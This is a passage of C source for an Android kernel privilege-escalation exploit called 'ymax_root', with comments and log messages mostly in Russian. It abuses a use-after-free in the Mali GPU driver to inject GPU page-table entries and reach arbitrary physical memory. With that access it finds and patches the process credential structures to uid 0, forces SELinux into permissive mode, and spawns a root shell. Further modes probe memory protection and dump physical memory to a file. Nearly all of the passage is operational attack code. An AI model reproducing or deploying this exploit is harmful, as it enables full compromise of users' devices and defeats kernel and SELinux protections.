    // SMOKE: PGD-\u0432\u0430\u043b\u0438\u0434\u0430\u0446\u0438\u044f \u043d\u0430 \u0434\u0432\u0443\u0445 \u0438\u0437\u0432\u0435\u0441\u0442\u043d\u044b\u0445 \u043f\u0430\u0440\u0430\u0445
    uint64_t ph = 0;
    int s1 = va_to_phys(itask_va, &ph, dsz);
    uint64_t ph2 = 0;
    int s2 = va_to_phys(icva, &ph2, dsz);
    printf("[W] smoke: itask_va\u21920x%llx (rc=%d, \u0436\u0434\u0430\u043b\u0438 0x%llx), icva\u21920x%llx (rc=%d, \u0436\u0434\u0430\u043b\u0438 0x3317d08)\n",
           (unsigned long long)ph, s1, (unsigned long long)ITASK,
           (unsigned long long)ph2, s2);
    fflush(stdout);
    if (s1 && s2) { printf("[W] PGD \u0435\u0440\u0443\u043d\u0434\u0430 \u2014 \u0432\u044b\u0445\u043e\u0434\n"); return 1; }

    uint64_t node; memcpy(&node, p1 + 0x600 + TSOFF, 8);
    printf("[W] init_task.tasks.next (VA) = 0x%llx (self \u0431\u044b\u043b \u0431\u044b 0x%llx)\n",
           (unsigned long long)node, (unsigned long long)(itask_va + TSOFF));
    if (node == itask_va + TSOFF) { printf("[W] \u0441\u043f\u0438\u0441\u043e\u043a \u043f\u0443\u0441\u0442 (?), \u0432\u044b\u0445\u043e\u0434\n"); return 1; }
    fflush(stdout);

    int nseen = 0, nfound = 0, badstop = 0;
    for (int step = 0; step < 600; step++) {
        uint64_t tb = node - TSOFF;              // VA \u0431\u0430\u0437\u044b \u0442\u0430\u0441\u043a\u0430 (page-aligned)
        uint64_t tphys = 0;
        int rc = va_to_phys(tb, &tphys, dsz);
        if (rc != 0) {
            printf("[W] va_to_phys(base)=%d \u0434\u043b\u044f VA=0x%llx \u2014 \u0441\u0442\u043e\u043f\n", rc, (unsigned long long)tb);
            badstop = 1; break;
        }
        if (tphys < 0x1000000 || tphys > 0x7f800000) {
            printf("[W] \u043a\u0440\u0438\u0432\u043e\u0439 phys=0x%llx \u2014 \u0441\u0442\u043e\u043f\n", (unsigned long long)tphys);
            badstop = 1; break;
        }
        uint8_t pg[4096];
        if (read_phys_page(tphys, pg, dsz) != 0) {
            printf("[W] \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0430 \u0442\u0430\u0441\u043a\u0430 \u043d\u0435 \u0447\u0438\u0442\u0430\u0435\u0442\u0441\u044f (phys=0x%llx) \u2014 \u0441\u0442\u043e\u043f\n",
                   (unsigned long long)tphys);
            badstop = 1; break;
        }
        uint64_t nextNode = 0, credva = 0;
        memcpy(&nextNode, pg + TSOFF, 8);
        memcpy(&credva, pg + CREDOFF, 8);
        char comm9[10]; memcpy(comm9, pg + COMMOFF, 9); comm9[9] = 0;
        struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts);
        printf("[W][%ld.%03ld] task VA=0x%llx phys=0x%llx comm='%.9s' cred=0x%llx\n",
               ts.tv_sec, ts.tv_nsec / 1000000,
               (unsigned long long)tb, (unsigned long long)tphys, comm9,
               (unsigned long long)credva);
        fflush(stdout);
        int is_ours = (memcmp(comm9, "ymax_root", 9) == 0);
        int is_adbd = (memcmp(comm9, "adbd", 4) == 0);
        if (is_ours || is_adbd)
            printf("[W] TARG: comm=%.9s %s\n", comm9, is_adbd ? "(adbd)" : "(\u043c\u043e\u0439)");
        if (credva && (is_ours || is_adbd)) {
            uint64_t cph = 0;
            if (va_to_phys(credva, &cph, dsz) == 0 && cph >= 0x2000000 && cph < 0x7f800000) {
                int dup = 0;
                for (int c = 0; c < nchits; c++) if (chits[c].phys == cph) { dup = 1; break; }
                if (!dup && nchits < CRED_HITS_MAX) {
                    chits[nchits].phys = cph; chits[nchits].usage = 0; chits[nchits].shift = 0;
                    nchits++; nfound++;
                    printf("[W] *** \u041d\u0410\u0428 cred \u043d\u0430\u0439\u0434\u0435\u043d: phys=0x%llx ***\n", (unsigned long long)cph);
                }
            }
        }
        nseen++;
        if (nextNode == itask_va + TSOFF) { printf("[W] \u043a\u0440\u0443\u0433 \u0437\u0430\u043c\u043a\u043d\u0443\u043b\u0441\u044f \u0437\u0430 %d \u0448\u0430\u0433\u043e\u0432\n", step + 1); break; }
        if (!nextNode) { printf("[W] next=0 \u2014 \u0441\u0442\u043e\u043f\n"); badstop = 1; break; }
        node = nextNode;
    }
    printf("[W] \u043f\u0440\u043e\u0439\u0434\u0435\u043d\u043e: %d, \u043d\u0430\u0439\u0434\u0435\u043d\u043e ymax_root: %d, chits=%d, badstop=%d\n",
           nseen, nfound, nchits, badstop);
    fflush(stdout);

    g_pg_ok = 0;  // \u0441\u0430\u043b\u044c\u043d\u043e\u0435 \u043e\u0447\u0438\u0441\u0442\u043a\u043e\u0439 \u043a\u044d\u0448\u0430
    set_window(g_l2_phys | 0x443); usleep(50000);
    for (int i = 0; i < 4; i++)
        write_value(fd2, match_B + win_slot * 0x1000 + g_free_entries[i] * 8, 2, 0);

    if (nchits) {
         printf("[W] \u043f\u0430\u0442\u0447 %d cred...\n", nchits);
        fflush(stdout);
        // \u0431\u0435\u0437 fork! fork \u043f\u043e\u0441\u043b\u0435 \u043e\u043a\u043d\u0430 = \u043f\u0430\u043d\u0438\u043a\u0430 \u043a\u0435\u0440\u043d\u0435\u043b\u0430 (\u043d\u0430\u0431\u043b\u044e\u0434\u0430\u0435\u0442\u0441\u044f 2\u0445)
        int c = 0;
        while (c < nchits) {
            uint64_t page = chits[c].phys & ~0xFFFULL;
            int e = c;
            while (e < nchits && (chits[e].phys & ~0xFFFULL) == page) e++;
            cred_patch_page(page, c, e - c);
            c = e;
        }
        printf("[W] \u043f\u0430\u0442\u0447 \u0441\u0434\u0435\u043b\u0430\u043d, thrash...\n"); fflush(stdout);
        for (int pass = 0; pass < 3; pass++)
            for (int cpu = 0; cpu < 4; cpu++) { migrate_to_cpu(cpu); cpu_cache_thrash(); }
        printf("[W] thrash \u0433\u043e\u0442\u043e\u0432, \u0436\u0434\u0451\u043c root...\n"); fflush(stdout);
        // selinux -> permissive (\u0435\u0441\u043b\u0438 \u0435\u0449\u0451 enforcing)
        set_window(g_l2_phys | 0x443); usleep(50000);   // \u043e\u043a\u043d\u043e \u0432\u0435\u0440\u043d\u0443\u0442\u044c \u043d\u0430 L2 (\u0440\u0435\u0434\u0431\u0435\u043a)
        uint8_t pre[4096];
        if (read_phys_page(0x3514000, pre, dsz) == 0)
            printf("[W] selinux pre: %02x %02x %02x %02x\n", pre[0x6e8], pre[0x6e9], pre[0x6ea], pre[0x6eb]);
        else
            printf("[W] selinux pre read FAIL\n");
        int se_ok = 0;
        for (int tr = 0; tr < 15 && !se_ok; tr++) {
            if (tr) printf("[W] selinux retry %d\n", tr);
            wphys32(0x35146e8, 0x01000000);
            wphys32(0x35146e8, 0x01000000);
            usleep(200000);
            set_window(g_l2_phys | 0x443); usleep(50000);
            uint8_t rb[4096];
            if (read_phys_page(0x3514000, rb, dsz) == 0) {
                printf("[W] selinux RAM(t%d): %02x %02x %02x %02x\n", tr,
                       rb[0x6e8], rb[0x6e9], rb[0x6ea], rb[0x6eb]);
                se_ok = (rb[0x6e9] == 0x00);
            } else {
                printf("[W] selinux RAM read FAIL (t%d)\n", tr);
            }
            set_window(g_l2_phys | 0x443); usleep(100000);
        }
        if (se_ok) {
            for (int sp = 0; sp < 3; sp++)
                for (int cpu = 0; cpu < 4; cpu++) { migrate_to_cpu(cpu); cpu_cache_thrash(); }
            printf("[W] selinux PERMISSIVE \u0437\u0430\u0444\u0438\u043a\u0441\u0438\u0440\u043e\u0432\u0430\u043d \u0432 DRAM\n");
        } else {
            printf("[W] selinux: 15 \u043f\u043e\u0431\u044b\u0442\u043e\u043a \u043d\u0435 \u0437\u0430\u043a\u0440\u0435\u043f\u0438\u043b\u0438 \u0437\u0430\u043f\u0438\u0441\u044c\n");
        }
        printf("[W] selinux permissive \u0441\u043b\u043e\u0432\u043e \u0437\u0430\u043f\u0438\u0441\u0430\u043d\n"); fflush(stdout);
        for (int q = 0; q < CRED_WAIT_LOOPS; q++) {
            printf("[W] q%d pre-getuid\n", q); fflush(stdout);
            int u0 = getuid();
            printf("[W] q%d post-getuid uid=%d\n", q, u0); fflush(stdout);
            if (u0 == 0) { cpu_cache_thrash(); try_become_root_shell(); }
            usleep(100000);
        }
        printf("[W] uid=%d %s\n", getuid(), getuid()==0?"=== ROOT ===":"(\u043d\u0435 \u0432\u044b\u0448\u043b\u043e)");
    }
    return 0;
}


static int do_cred_gpu(uint64_t scan_start) {
    printf("[G] === GPU CRED SCAN (0x%llx - 0x%llx) ===\n",
           (unsigned long long)scan_start,
           (unsigned long long)(g_scan_end ? g_scan_end : CRED_SCAN_END));
    uint64_t scan_end = g_scan_end ? g_scan_end : CRED_SCAN_END;

    // Init batch buf + L2 trick
    init_bcbuf();
    if (!g_bcgpu) { printf("[G] batch buf fail\n"); return 1; }

    if (!g_nfree) {
        size_t sz = 4u << 20;
        uint8_t* d0 = mmu_dump(fd2, sz);
        if (!d0) { printf("[G] mmu_dump fail\n"); return 1; }
        parse_tree(d0, sz);
        g_l2_phys = l2_table_phys;
        if (g_l2_phys)
            for (int b = 0; b < ndblk; b++)
                if (dblk[b].level == 2 && dblk[b].table_phys == g_l2_phys) {
                    for (int i = 0; i < 512 && g_nfree < 512; i++)
                        if ((dblk[b].entries[i] & 3) != 3)
                            g_free_entries[g_nfree++] = i;
                    break;
                }
        munmap(d0, sz);
    }
    printf("[G] L2=0x%llx free=%d bcgpu=0x%llx\n",
           (unsigned long long)g_l2_phys, g_nfree, (unsigned long long)g_bcgpu);
    if (!g_l2_phys || g_nfree < BC_MAX) { printf("[G] L2 init fail\n"); return 1; }

    // Fork children: каждый держит СВОИ живые cred после setresuid/commit
    int pipefd[2];
    if (pipe(pipefd) < 0) { perror("pipe"); return 1; }
    gid_t shell_gid = getgid();
    uid_t shell_uid = getuid();
    pid_t children[CRED_GPU_FORKS]; int nchild = 0;
    printf("[G] forking %d children (каждый %d cred-аллокаций)...\n",
           CRED_GPU_FORKS, CRED_ALLOCS_PER_CHILD);
    for (int i = 0; i < CRED_GPU_FORKS; i++) {
        pid_t p = fork();
        if (p == 0) {
            close(fd1); close(fd2); close(pipefd[1]);
            // prepare_creds+commit_creds: живой cred на каждого ребёнка
            setresuid(shell_uid, shell_uid, shell_uid);
            setresgid(shell_gid, shell_gid, shell_gid);
            setfsuid(shell_uid);
            setfsgid(shell_gid);
            setresuid(shell_uid, shell_uid, shell_uid);
            setresgid(shell_gid, shell_gid, shell_gid);
            setfsuid(shell_uid);
            setfsgid(shell_gid);
            setresuid(shell_uid, shell_uid, shell_uid);
            char buf; read(pipefd[0], &buf, 1); close(pipefd[0]);
            // ждём патч: getuid читает cred->uid — stale-кэш держит 2000 до evict
            for (int q = 0; q < CRED_WAIT_LOOPS; q++) {
                if (getuid() == 0) try_become_root_shell();
                usleep(100000);
            }
            _exit(1);
        }
        if (p > 0) children[nchild++] = p;
        else { printf("[G] fork %d: %s\n", i, strerror(errno)); break; }
    }
    printf("[G] forked %d\n", nchild); sleep(1);

    // Scan phase: инжект L2-записей -> mmu_dump читает каждый физ.страниц. содержимое
    // пак: 384 страниц/батч (все free L2-слоты), set_window один раз, fast-jobs по 3ms
    int SCMAX = g_nfree > 384 ? 384 : (g_nfree > 64 ? g_nfree - 64 : 64);
    set_window(g_l2_phys | 0x443);
    usleep(100000);
    nchits = 0;
    int batch = 0;
    size_t dsz = 4u << 20;
    static uint64_t ma[512];

    for (uint64_t base = scan_start; base < scan_end; base += (uint64_t)SCMAX * 0x1000) {
        int n = SCMAX;
        if (base + (uint64_t)n * 0x1000 > scan_end)
            n = (int)((scan_end - base) >> 12);
        if (n <= 0) break;
        for (int i = 0; i < n; i++) {
            ma[i] = match_B + win_slot * 0x1000 + g_free_entries[i] * 8;
            uint64_t mv = (base + i * 0x1000) | 0x403;
            wvalue_fast(fd2, ma[i], mv, 0);
        }

        uint8_t* d = mmu_dump(fd2, dsz);
        if (d) {
            parse_tree(d, dsz);
            for (int i = 0; i < n; i++) {
                uint64_t phys = base + i * 0x1000;
                for (int b = 0; b < ndblk; b++) {
                    if (dblk[b].level != 3 || dblk[b].table_phys != phys) continue;
                    uint32_t* p = (uint32_t*)dblk[b].entries;
                    // КЛАССИЧЕСКИЙ layout (проверен дизасом sys_getuid: uid@+0x04,
                    // sys_geteuid: euid@+0x14): usage@0, uid..fsgid@4..0x20, securebits@0x24
                    for (int off = 0; off + 24 <= 1024; off++) {
                        uint32_t usage = p[off];
                        int ok = (usage != 0) && p[off + 9] == 0; // securebits==0 (freed тоже)
                        if (ok)
                            for (int j = 1; j <= 8; j++)
                                if (p[off + j] != CRED_UID_SHELL) { ok = 0; break; }
                        if (!ok) continue;
                        if (nchits < CRED_HITS_MAX) {
                            chits[nchits].phys = phys + off * 4;
                            chits[nchits].usage = usage;
                            chits[nchits].shift = 0;
                            nchits++;
                            printf("[G] CRED #%d phys=0x%llx pg+0x%x usage=%u\n",
                                   nchits, (unsigned long long)(phys + off*4), off*4, usage);
                            if (nchits == 1) {
                                printf("[G] dump[0..25]:");
                                for (int k = 0; k < 26; k++)
                                    printf(" %08x", p[off+k]);
                                printf("\n");
                            }
                            fflush(stdout);
                        }
                    }
                    break;
                }
            }
            munmap(d, dsz);
        }

        batch++;
        if (batch % 10 == 0) {
            printf("[G] batch %d base=0x%08llx hits=%d\n",
                   batch, (unsigned long long)base, nchits);
            fflush(stdout);
        }
        if (nchits >= CRED_HITS_ENOUGH) { printf("[G] бросаю скан\n"); break; }
    }
    // финальная очистка L2: все использованные слоты -> invalid
    set_window(g_l2_phys | 0x443);
    usleep(50000);
    for (int i = 0; i < SCMAX; i++)
        wvalue_fast(fd2, match_B + win_slot * 0x1000 + g_free_entries[i] * 8, 2, 0);
    usleep(50000);

    printf("[G] scan done: %d creds за %d батчей\n", nchits, batch);

    if (!nchits) {
        printf("[G] creds не найдены — killing children\n");
        close(pipefd[1]);
        for (int i = 0; i < nchild; i++) { kill(children[i], SIGKILL); waitpid(children[i], NULL, 0); }
        close(pipefd[0]);
        return 1;
    }

    // Patch phase: группируем по страницам (1 set_window на страницу)
    printf("[G] патч %d creds via GPU WRITE_VALUE...\n", nchits);
    int c = 0;
    while (c < nchits) {
        uint64_t page = chits[c].phys & ~0xFFFULL;
        int e = c;
        while (e < nchits && (chits[e].phys & ~0xFFFULL) == page) e++;
        cred_patch_page(page, c, e - c);
        c = e;
    }
    printf("[G] patch done\n");

    set_window(g_l2_phys | 0x443);
    usleep(100000);

    // Verify: пере-читаем страницы с hit'ами через mmu_dump — CPU видит DRAM
    uint64_t pma[BC_MAX], pmv[BC_MAX];
    uint64_t pages[BC_MAX];
    int npages = 0;
    for (int c = 0; c < nchits && npages < BC_MAX; c++) {
        uint64_t pg = chits[c].phys & ~0xFFFULL;
        int dup = 0;
        for (int k = 0; k < npages; k++) if (pages[k] == pg) { dup = 1; break; }
        if (!dup) pages[npages++] = pg;
    }
    for (int off = 0; off < npages; off += BC_MAX) {
        int n = npages - off < BC_MAX ? npages - off : BC_MAX;
        for (int i = 0; i < n; i++) {
            pma[i] = match_B + win_slot * 0x1000 + g_free_entries[i] * 8;
            pmv[i] = pages[off + i] | 0x403;
        }
        batch_wv(fd2, pma, pmv, NULL, n);
        uint8_t* d = mmu_dump(fd2, dsz);
        if (d) {
            parse_tree(d, dsz);
            int npatched = 0, nseen = 0;
            for (int i = 0; i < n; i++) {
                uint64_t phys = pages[off + i];
                for (int b = 0; b < ndblk; b++) {
                    if (dblk[b].level != 3 || dblk[b].table_phys != phys) continue;
                    uint32_t* p = (uint32_t*)dblk[b].entries;
                    for (int hh = 0; hh < nchits; hh++) {
                        if ((chits[hh].phys & ~0xFFFULL) != phys) continue;
                        int o = (int)((chits[hh].phys & 0xFFF) / 4) + 2; // euid@+0x08
                        nseen++;
                        if (p[o] == 0) npatched++;
                        else printf("[G] verify MISS: 0x%llx euid=%u usage=%u\n",
                                    (unsigned long long)chits[hh].phys, p[o], p[o - 2]);
                    }
                    break;
                }
            }
            printf("[G] verify: %d/%d патчей в DRAM\n", npatched, nseen);
            munmap(d, dsz);
        }
        for (int i = 0; i < n; i++) pmv[i] = 2;
        batch_wv(fd2, pma, pmv, NULL, n);
    }

    // Cache thrash all CPUs — гоним CPU D-cache, чтобы дети/родитель увидели новые cred
    printf("[G] cache thrash all CPUs...\n");
    for (int pass = 0; pass < 3; pass++)
        for (int cpu = 0; cpu < 4; cpu++) { migrate_to_cpu(cpu); cpu_cache_thrash(); }

    // Signal children; родитель сам ждёт root тоже — кто первый возьмёт flock, тот shell
    printf("[G] signaling %d children...\n", nchild);
    close(pipefd[1]);
    for (int q = 0; q < CRED_WAIT_LOOPS; q++) {
        if (getuid() == 0) try_become_root_shell();
        usleep(100000);
    }
    close(pipefd[0]);

    // reap: выживший ребёнок = root-shell (не убивать!), блокирующе ждём его выход
    int root_n = 0, sh_pid = 0;
    for (int i = 0; i < nchild; i++) {
        int st;
        pid_t r = waitpid(children[i], &st, WNOHANG);
        if (r == 0) { if (!sh_pid) sh_pid = children[i]; continue; }
        if (r > 0) {
            if (WIFEXITED(st) && WEXITSTATUS(st) == 0) root_n++;
            continue;
        }
        kill(children[i], SIGKILL); waitpid(children[i], &st, 0);
    }
    printf("[G] exited-root: %d/%d\n", root_n, nchild);
    if (sh_pid) {
        printf("[G] shell живёт (pid=%d) — жду выхода...\n", sh_pid);
        int st;
        waitpid(sh_pid, &st, 0);
        if (WIFEXITED(st) && WEXITSTATUS(st) == 0) root_n++;
    }
    for (int i = 0; i < nchild; i++) {
        int st;
        if (waitpid(children[i], &st, WNOHANG) == 0) {
            kill(children[i], SIGKILL); waitpid(children[i], &st, 0);
        }
    }
    printf("[G] root: %d/%d %s\n", root_n, nchild, root_n > 0 ? "=== ROOT ===" : "miss");
    return root_n > 0 ? 0 : 1;
}

// ---------- TZASC probe: test GPU writability of physical addresses ----------
static int read_phys_qword(uint64_t phys, uint64_t* val) {
    if (!g_nfree || !g_l2_phys) return -1;
    uint64_t page = phys & ~0xFFFULL;
    int k = g_free_entries[0];
    int save = win_slot;
    win_slot = OVERWRITE_INDEX + 62;
    set_window(g_l2_phys | 0x443);
    usleep(50000);
    write_value(fd2, match_B + win_slot * 0x1000 + k * 8, page | 0x403, 0);
    usleep(100000);
    size_t sz = 4u << 20;
    uint8_t* d = mmu_dump(fd2, sz);
    int ok = 0;
    if (d) {
        parse_tree(d, sz);
        for (int b = 0; b < ndblk; b++)
            if (dblk[b].level == 3 && dblk[b].table_phys == page) {
                *val = *(uint64_t*)((uint8_t*)dblk[b].entries + (phys & 0xFFF));
                ok = 1; break;
            }
        munmap(d, sz);
    }
    set_window(g_l2_phys | 0x443);
    usleep(50000);
    write_value(fd2, match_B + win_slot * 0x1000 + k * 8, 2, 0);
    usleep(50000);
    win_slot = save;
    return ok ? 0 : -1;
}

static int do_tzasc_probe(void) {
    printf("[P] === TZASC PROBE ===\n");
    if (!g_nfree) {
        size_t sz = 4u << 20;
        uint8_t* d0 = mmu_dump(fd2, sz);
        if (!d0) return -1;
        parse_tree(d0, sz);
        g_l2_phys = l2_table_phys;
        if (g_l2_phys)
            for (int b = 0; b < ndblk; b++)
                if (dblk[b].level == 2 && dblk[b].table_phys == g_l2_phys) {
                    for (int i = 0; i < 512 && g_nfree < 512; i++)
                        if ((dblk[b].entries[i] & 3) != 3) g_free_entries[g_nfree++] = i;
                    break;
                }
        printf("[P] L2=0x%llx free=%d\n", (unsigned long long)g_l2_phys, g_nfree);
        // print physical addresses of GPU data pages (L3 entries)
        for (int i = 0; i < nl3 && i < 3; i++) {
            printf("[P] L3[%d] tbl=0x%llx pages:", i, (unsigned long long)l3s[i].tphys);
            int shown = 0;
            for (int j = 0; j < 512 && shown < 4; j++) {
                uint64_t e = l3s[i].ents[j];
                if ((e & 3) == 3) { printf(" 0x%llx", (unsigned long long)(e & ~0xFFFULL)); shown++; }
            }
            printf("\n");
        }
        munmap(d0, sz);
    }
    if (!g_nfree || !g_l2_phys) { printf("[P] no L2\n"); return -1; }

    // Use a known-writable GPU page as control (from validate), then probe high addresses.
    // Do NOT probe kernel image region (0x2080000) — TZASC blocks GPU MMU walk itself,
    // causing GPU fault and crash.
    // validate_write target phys is in res_map — use first res page as control.
    uint64_t ctrl_phys = 0;
    {
        size_t sz2 = 4u << 20;
        uint8_t* dc = mmu_dump(fd2, sz2);
        if (dc) {
            parse_tree(dc, sz2);
            for (int b = 0; b < nl3 && !ctrl_phys; b++)
                for (int i = 0; i < NRES && !ctrl_phys; i++) {
                    if (res_real[i] < l3s[b].va_base || res_real[i] >= l3s[b].va_base + 0x200000) continue;
                    int ei = (int)((res_real[i] - l3s[b].va_base) >> 12);
                    if ((l3s[b].ents[ei] & 3) == 3)
                        ctrl_phys = l3s[b].ents[ei] & 0x0000FFFFFFFFF000ULL;
                }
            munmap(dc, sz2);
        }
    }
    printf("[P] ctrl_phys=0x%llx (GPU-allocated, expect WRITABLE)\n",
           (unsigned long long)ctrl_phys);

    // Probe: control + range above kernel heap (~100-800MB range)
    uint64_t probes[16];
    int np = 0;
    if (ctrl_phys) probes[np++] = ctrl_phys;
    probes[np++] = 0x10000000;
    probes[np++] = 0x18000000;
    probes[np++] = 0x20000000;
    probes[np++] = 0x30000000;
    probes[np++] = 0x40000000;
    probes[np++] = 0x50000000;
    probes[np++] = 0x60000000;
    probes[np++] = 0x70000000;
    int n = np;
    for (int i = 0; i < n; i++) {
        uint64_t P = probes[i];
        uint64_t before = 0, after = 0;
        uint64_t marker = 0xDEAD000000000000ULL | ((P >> 12) & 0xFFFF);
        if (read_phys_qword(P, &before) < 0) {
            printf("[P] 0x%08llx: read fail\n", (unsigned long long)P);
            continue;
        }
        // write marker via L3 redirect
        set_window((P & ~0xFFFULL) | 0x443);
        write_value(fd2, match_B + win_slot * 0x1000 + (P & 0xFFF), marker, 0);
        usleep(150000);
        // readback (no gpu_cache_flush — it hangs on r25p1)
        if (read_phys_qword(P, &after) < 0) {
            printf("[P] 0x%08llx: readback fail\n", (unsigned long long)P);
            continue;
        }
        int wr = (after == marker);
        printf("[P] 0x%08llx: %s (was 0x%llx now 0x%llx)\n",
               (unsigned long long)P, wr ? "GPU-WRITABLE" : "BLOCKED",
               (unsigned long long)before, (unsigned long long)after);
        if (wr) {
            set_window((P & ~0xFFFULL) | 0x443);
            write_value(fd2, match_B + win_slot * 0x1000 + (P & 0xFFF), before, 0);
            usleep(50000);
        }
    }
    printf("[P] === DONE ===\n");
    return 0;
}

// произвольный phys-dump через L2-инжект (для pstore/ramoops и прочего)
static int do_xdump(uint64_t phys, size_t len) {
    printf("[X] дамп phys 0x%llx len 0x%zx\n", (unsigned long long)phys, len);
    if (!g_nfree) {
        size_t sz = 4u << 20;
        uint8_t* d0 = mmu_dump(fd2, sz);
        if (!d0) return 1;
        parse_tree(d0, sz);
        g_l2_phys = l2_table_phys;
        if (g_l2_phys)
            for (int b = 0; b < ndblk; b++)
                if (dblk[b].level == 2 && dblk[b].table_phys == g_l2_phys) {
                    for (int i = 0; i < 512 && g_nfree < 512; i++)
                        if ((dblk[b].entries[i] & 3) != 3)
                            g_free_entries[g_nfree++] = i;
                    break;
                }
        munmap(d0, sz);
    }
    if (!g_nfree) { printf("[X] нет L2\n"); return 1; }
    uint8_t* buf = calloc(1, len);
    if (!buf) return 1;
    size_t dsz = 4u << 20;
    size_t done = 0;
    int batch = 0;
    int void_pages = 0;
    (void)void_pages;
    while (done < len) {
        size_t want = len - done;
        if (want > (size_t)BC_MAX * 0x1000) want = (size_t)BC_MAX * 0x1000;
        int n = (int)(want >> 12);
        set_window(g_l2_phys | 0x443);
        usleep(100000);
        // поштучная инжекция (как в dump_kernel — batch_wv ненадёжен)
        for (int i = 0; i < n; i++) {
            uint64_t pg = phys + done + (size_t)i * 0x1000;
            write_value(fd2, match_B + win_slot * 0x1000 + g_free_entries[i] * 8, pg | 0x403, 0);
            usleep(20000);
        }
        usleep(100000);
        uint8_t* d = mmu_dump(fd2, dsz);
        int got = 0;
        if (d) {
            parse_tree(d, dsz);
            for (int i = 0; i < n; i++) {
                uint64_t pg = phys + done + (size_t)i * 0x1000;
                for (int b = 0; b < ndblk; b++) {
                    if (dblk[b].level != 3 || dblk[b].table_phys != pg) continue;
                    memcpy(buf + done + (size_t)i * 0x1000, dblk[b].entries, 0x1000);
                    got++;
                    break;
                }
            }
            munmap(d, dsz);
            printf("[X] батч %d: блоков в dump=%d, найдено=%d\n", batch, ndblk, got);
        }
        // очистка поштучно
        set_window(g_l2_phys | 0x443);
        usleep(50000);
        for (int i = 0; i < n; i++) {
            write_value(fd2, match_B + win_slot * 0x1000 + g_free_entries[i] * 8, 2, 0);
            usleep(20000);
        }
        done += want;
        batch++;
        fflush(stdout);
        if (!got) { printf("[X] чтение не идёт\n"); break; }
    }
    int f = open("/data/local/tmp/xdump.bin", O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (f >= 0) { write(f, buf, done); close(f); printf("[X] сохранено %zu байт\n", done); }
    free(buf);
    return 0;
}

// ---------- main ----------
int main(int argc, char** argv) {
    setbuf(stdout, NULL); setbuf(stderr, NULL);
    const char* mode = argc > 1 ? argv[1] : "validate";
    printf("== ymax_root (%s) ==\n", mode);
    // при OOM пусть убивают НАС, а не паникуют ядром
    FILE* oom = fopen("/proc/self/oom_score_adj", "w");
    if (oom) { fputs("1000", oom); fclose(oom); }
    printf("[*] uptime: ");
    fflush(stdout); system("cat /proc/uptime");

    fd1 = open_dev(); setup_mali(fd1);
    jit_init(fd1);
    prologue(fd1);
    fd2 = open_dev(); setup_mali(fd2);

    int ok = 0;
    for (int round = 1; round <= 6 && !ok; round++) {
        printf("[*] раунд %d\n", round);
        if (trigger_evict() == 1) ok = 1;
    }
    if (!ok) { printf("[x] эвикции нет\n"); return 1; }

    // СБРОС ВСЕГО ДАВЛЕНИЯ ДО спрея (OOM убивает процесс на спрее)
    for (int i = 0; i < flush_count; i++) munmap(flush_regions[i], FLUSH_SIZE);
    printf("[*] линейное давление сброшено (%d)\n", flush_count);
    flush_count = 0;
    for (int i = 0; i < npress; i++) {
        munmap(press_map[i], 4096 << 12);
        mem_commit_pages(fd2, press_real[i], 0);
    }
    printf("[*] kbase-давление сброшено (%d)\n", npress);
    npress = 0;
    usleep(300000);

    usleep(3000);
    migrate_to_cpu(0);
    if (spray_and_alias() < 0) return 1;
    printf("[*] давление уже сброшено ранее\n");

    drain_release(fd1);
    drain_release(fd2);

    // fault in alias pages ДО jit_free — иначе чтение после free = panic
    printf("[*] fault alias pages...\n"); fflush(stdout);
    for (int i = 0; i < SPRAY_NUM; i++) {
        volatile uint8_t* p = (volatile uint8_t*)alias_sub[i];
        for (int pg = 0; pg < SPRAY_PAGES; pg++)
            (void)p[pg * 0x1000];
    }
    printf("[*] alias faulted OK\n"); fflush(stdout);

    uint8_t dangling_id = jits[evicted_round].id;
    printf("[*] jit_free(ВИСЯЧИЙ id=%u)...\n", dangling_id);
    jit_free_id(fd1, dangling_id);
    sleep(1);

    if (!strcmp(mode, "cpu_test") || !strcmp(mode, "heap")) {
        if (find_freed() < 0) return 1;
        if (!strcmp(mode, "cpu_test")) return do_cpu_write_test();
        return do_heap_spray();
    }

    printf("[*] reserve %d x %d...\n", NRES, RESERVED_SIZE);
    for (int i = 0; i < NRES; i++) {
        uint8_t* m;
        uint64_t real = alloc_bound(fd2, RESERVED_SIZE, 0, &m);
        if (!real) break;
        res_real[i] = real; res_map[i] = m;
        if (mem_commit_pages(fd2, real, RESERVED_SIZE) < 0) break;
        memset(res_map[i], 0x42, RESERVED_SIZE << 12);
    }
    sleep(1);

    int NCAP = 0;   // ретраи капчи внутри одного процесса

    if (!strncmp(mode, "xdump,", 6)) {
        // усиливаем давление fd2 — чтобы новые L3-таблицы легли в освободившийся чанк
        printf("[X] усиление давления fd2...\n");
        for (int i = 0; i < 96; i++) {
            uint8_t* m = NULL;
            uint64_t r = alloc_bound(fd2, 16, 0, &m);
            if (!r) break;
            if (m) munmap(m, 16 << 12);
        }
    }

    while (find_freed() < 0 || capture_window() < 0) {
        // ретрай капчи: пересоздаём резерв и захват на этом же прологе
        NCAP++;
        if (NCAP >= 4) { printf("[-] капча не удалась после %d попыток\n", NCAP); return 1; }
        printf("[*] капча ретрай %d...\n", NCAP);
        memset(res_map, 0, sizeof res_map);
        memset(res_real, 0, sizeof res_real);
        for (int i = 0; i < NRES; i++) {
            uint8_t* m;
            uint64_t real = alloc_bound(fd2, RESERVED_SIZE, 0, &m);
            if (!real) break;
            res_real[i] = real; res_map[i] = m;
            if (mem_commit_pages(fd2, real, RESERVED_SIZE) < 0) break;
            memset(res_map[i], 0x42, RESERVED_SIZE << 12);
        }
        sleep(1);
    }

    if (!strncmp(mode, "xdump,", 6)) {
        unsigned long long xp = 0; unsigned long long xl = 0;
        if (sscanf(mode + 6, "%llx,%llx", &xp, &xl) != 2 || !xp || !xl || xl > (8u << 20))
            { printf("[X] args\n"); return 1; }
        init_bcbuf();
        if (!g_bcgpu) return 1;
        return do_xdump(xp, (size_t)xl);
    }

    if (!strcmp(mode, "validate")) {
        validate_write();
        printf("[*] живём: "); fflush(stdout); system("cat /proc/uptime");
        return 0;
    }
    if (!strcmp(mode, "probe")) {
        if (validate_write() < 0) { printf("[x] validate failed\n"); return 1; }
        do_tzasc_probe();
        return 0;
    }
    if (!strncmp(mode, "cred_gpu", 8)) {
        if (validate_write() < 0) { printf("[x] validate failed\n"); return 1; }
        unsigned long long s1 = 0, s2 = 0;
        int nargs = sscanf(mode, "cred_gpu,%llx,%llx", &s1, &s2);
        uint64_t scan_start = CRED_SCAN_START;
